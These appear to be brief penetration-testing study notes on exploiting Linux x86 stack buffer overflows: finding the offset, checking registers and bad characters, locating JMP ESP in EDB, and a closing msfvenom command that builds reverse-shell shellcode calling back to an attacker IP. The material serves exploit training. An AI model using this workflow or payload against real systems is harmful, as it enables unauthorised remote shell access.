Linux Buffer Overflows

Use EDB as the debugger

Similar to the Revision, First look for the areas of where the overflow affects

> msf-pattern_create -l &lt;length&gt;

Look at the values and positions of the registers; depending on what are the register values, we take the appropriate action

- By default, we will want to use the stack if we can manipulate the stack; We can then find the "JMP ESP" Instruction
- If we are not manipulating the stack but am manipulating somewhere else pointed by other registers (E.g. EAX), then we need to setup two stages of execution, the first stage adjust the register values to point to where we want it to be pointed "ADD EAX, 12" and then do the appropriate jump instruction "JMP EAX"

> msf-nasm_shell

We then check for bad chars for the shellcode,Â 

After that we need to set the return address to jump to the instructions of the first stage, which should be in the stack (JMP ESP)

- Use EDB's OpcodeSearcher plugin

Set the breakpoint at the JMP ESP instruction and test (if necessary)

Then we get the shellcode using msfvenom

> msfvenom -p linux/x86/shell\_reverse\_tcp LHOST=&lt;KALI IP&gt; LPORT=443 -b "\\x&lt;badchars&gt;" -f py -v shellcode
